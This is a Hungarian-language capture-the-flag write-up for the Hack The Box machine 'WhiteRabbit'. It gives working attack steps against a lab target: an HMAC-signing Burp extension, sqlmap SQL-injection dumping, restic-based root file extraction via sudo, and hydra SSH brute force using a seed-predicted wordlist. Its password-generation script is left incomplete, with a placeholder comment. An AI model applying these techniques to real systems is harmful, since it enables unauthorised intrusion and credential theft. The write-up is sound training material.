
# HTB WhiteRabbit - Writeup (magyar)

**Platform:** Linux  

**IP:** 10.10.11.63

**Difficulty:** Insane  

**Author:** NoSec  


## Felderítés / Recon

```bash
22/tcp   open  ssh           OpenSSH 8.9p1 (protocol 2.0)
80/tcp   open  http          Caddy httpd
2222/tcp open  ssh           OpenSSH 8.9p1 (protocol 2.0)
```
Szolgáltatás infó: OS valószínűleg Linux-alapú, a Caddy webszerver fut.

---

## Előkészítés

- **Host fájl szerkesztése**
    ```bash
    sudo nano /etc/hosts
    ```
    ```
    10.10.11.XX     whiterabbit.htb status.whiterabbit.htb
    
- **Clock skew (időszinkron, ha szükséges)**
```bash
sudo rdate -n whiterabbit.htb
```

---

## Alközpontok és Web Feltárás

**Alközpontok felfedezése:**

A whiterabbit.htb alatti /status/ végpontot brute-force-olva (pl. gobuster,ffuf) megtaláltam a status.whiterabbit.htb-t, ami Uptime Kumát futtat. Egy kis kutakodás ([redacted URL] után a /status/temp/ oldalon új alközpontokat találtam:

- GoPhish: ddb0<link>.whiterabbit.htb
- Wikijs: a668<link>.whiterabbit.htb

**Webhookok nyomozása:**

A Wikijs endpoint ([redacted URL] egy webhookot mutatott az 28e<link>.whiterabbit.htb felé, ami gyanúsan nézett ki.

**Kihasználás / Exploitation**

SQLi a Webhookban

A webhook egy x-gophish-signature HMAC aláírást követelt. A titkos kulcsot innen szedtem ki:

Forrás: [redacted URL]
Kulcs: 3CWV<key>

Az HMAC-ot a CyberChef-fel generáltam ([redacted URL] és egy teszt payloaddal SQLi-t próbáltam:
```bash
{"campaign_id":2,"email":"test \$\"","message":"Clicked Link"}
```
Láttam egy MySQL hibát, szóval sebezhető!

**BurpSuite Automatizálás**

Manuálisan lassú volt, ezért egy Burp kiterjesztést intéztem, ami automatikusan hozzáadja az HMAC fejlécet:

```bash
from burp import IBurpExtender, ISessionHandlingAction
from java.io import PrintWriter
from datetime import datetime
import hashlib, hmac

class BurpExtender(IBurpExtender, ISessionHandlingAction):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("HMAC Header")
        PrintWriter(callbacks.getStdout(), True).println("HMAC Header OK")
        callbacks.registerSessionHandlingAction(self)
        PrintWriter(callbacks.getStdout(), True).println("Session started")
        return

    def getActionName(self):
        return "HMAC Header"

    def performAction(self, currentRequest, macroItems):
        Secret = "3CWV<redacted>"
        stdout = PrintWriter(self._callbacks.getStdout(), True)
        requestInfo = self._helpers.analyzeRequest(currentRequest)
        BodyBytes = currentRequest.getRequest()[requestInfo.getBodyOffset():]
        BodyStr = self._helpers.bytesToString(BodyBytes)
        _hmac = hmac.new(Secret, BodyStr, digestmod=hashlib.sha256).hexdigest()
        headers = requestInfo.getHeaders()
        headers.add("x-gophish-signature: sha256=" + _hmac)
        message = self._helpers.buildHttpMessage(headers, BodyStr)
        currentRequest.setRequest(message)
        return
```
Telepítve a Burp Custom Extensions-ben (https://www.pentestpartners.com/security-blog/burp-hmac-header-extensions-a-how-to/)

**SQLmap Támadás**

Az SQLi-t sqlmap-mel automatizáltam:

```bash
sqlmap -u [redacted URL] POST --data '{"campaign_id":2,"email":"test@mail.com","message":"Clicked Link"}' -p email --proxy [redacted URL] --batch --dump --Level=5 --risk=3 -D temp -T command_log --flush
```

| ID  | Dátum               | Parancs                                                |
|-----|---------------------|---------------------------------------------------------|
| 103 | 2024-08-30 14:40:41 | `uname -a`                                             |
| 110 | 2024-08-30 15:16:05 | `restic init --repo rest:[redacted URL] |

**Jogosultság Növelés / Privilege Escalation**

-Restic Kihasználása

Egy Restic tárolót találtam [redacted URL] jelszóval: ygcsv<redacted> Ezzel mentést csináltam a /root/-ról:

```bash
export RESTIC_PASSWORD=ygcsv<pass>
export RESTIC_REPOSITORY=rest:[redacted URL]
sudo /usr/bin/restic init -r .
sudo restic -r . backup /root/
sudo restic -r . dump latest /root/morpheus
```
Kinyertem egy SSH kulcsot a morpheus-hoz, így be tudtam lépni:

```bash
ssh morpheus@whiterabbit.htb -p 22
```

```bash
morpheus@whiterabbit:/home/morpheus# ls
user.txt

```
User flag pipa! 🚀

**Neo Jelszó Generálás**

A /opt/neo-password-generator/neopassword-generator binárist Ghidra-val néztem meg. A gettimeofday()-ot használja seedként:

 -Számítás: tv_sec * 1000 + tv_usec / 1000 
 -20 karakteres jelszót generál rand() % 62-vel.
 
Mivel a neo 2024-08-30 14:40:42-kor futtatta, a másodperceket tudom, de a mikromásodperceket bruteforce-olnom kellett (0-999). Egy Python szkriptet használtam:

```python
from ctypes import CDLL
import datetime
libc = CDLL("libc.so.6")
seconds = datetime.datetime(2024, 8, 30, 14, 40, 42, tzinfo=datetime.timezone.utc).timestamp()
for i in range(0, 1000):
    # [Itt a rand() logika lenne, C-vel pontosabb]
```
Legeneráltam és jöhetett az SSH bruteforece.

```bash
python3 password_generator.py > passwords.txt
```

```bash
hydra -l neo -P passwords.txt ssh://whiterabbit.htb -t 20
```

Jelszó:
```nginx
WB<pass>
```

Miután beléptünk SSh-n már csak egy sudo -su parancsot kell használnunk, és kezünkben a root flag


```bash
root@whiterabbit:~# ls
root.txt
```

---

### 🧠 Jegyzetek & Magyarázat – Mit tanultam a gépből?

- **Webhook & SQLi abuse:** Az Uptime Kuma sebezhetőségei izgalmasak voltak, főleg a custom HMAC trükközés miatt.  
- **Restic kihasználás:** Meglepő volt, hogy egy sima backup tool milyen mértékű jogosultságemelést tud biztosítani.  
- **Bináris analízis:** A `gettimeofday()` alapú jelszógenerálás bruteforce-olása kemény agytorna volt.  
- **Automatizálás:** A Burp Suite és sqlmap kombó rengeteg időt spórolt, főleg a HMAC headerrel való szórakozásnál.

---

### ⚠️ Hibák, csapdák, tanácsok

- **Időszinkronra figyelj!** Elcsúszott idő esetén az SSH vagy más lépések fail-elnek.  
- **Bruteforce-hoz türelem kell!** A `/status/temp/` endpointot sokáig kerestem – fontos a jó lista.  
- **Spoilermentesen dokumentálj!** Ne írj le mindent, más is élvezhesse a felfedezést.  
- **Tesztelj újra mindent!** Az HMAC kulcsot például kétszer validáltam, mielőtt sqlmap-et futtattam volna.

---

### ✅ Összegzés

A WhiteRabbit egy remekül összerakott gép: a webes kihasználásoktól egészen a kreatív jogosultság-eszkalációig visz.  
Az Uptime Kuma, SQLi, Restic és bináris analízis kombója igazi pentester csemege volt.  
Mindkét flag megszerezve – user is, root is – szóval elégedett vagyok. 🚀

---

**Ajánlom mindenkinek**, aki szereti a kihívásokat, és néha szívesebben törne kreatív Linuxos gépeket AD helyett.  
Ha kérdésed van: keress bátran! 💬

---


